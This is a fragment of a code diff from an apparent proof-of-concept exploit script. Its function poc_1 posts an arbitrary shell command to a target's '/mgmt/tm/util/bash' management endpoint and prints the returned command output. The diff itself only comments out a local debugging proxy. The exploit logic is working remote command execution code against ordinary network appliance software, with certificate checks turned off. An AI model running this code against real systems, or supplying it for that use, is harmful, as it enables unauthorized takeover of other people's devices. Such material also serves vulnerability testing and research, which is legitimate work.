@@ -19,10 +19,10 @@ def poc_1(target_url, command):
     }
 
     data = json.dumps({'command': 'run' , 'utilCmdArgs': '-c ' + command})
-    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+    # proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
     check_url = target_url + '/mgmt/tm/util/bash'
     try:
-        r = requests.post(url=check_url, data=data, headers=headers, verify=False, timeout=20, proxies=proxies)
+        r = requests.post(url=check_url, data=data, headers=headers, verify=False, timeout=20)
         if r.status_code == 200 and 'commandResult' in r.text:
             default = json.loads(r.text)
             display = default['commandResult']
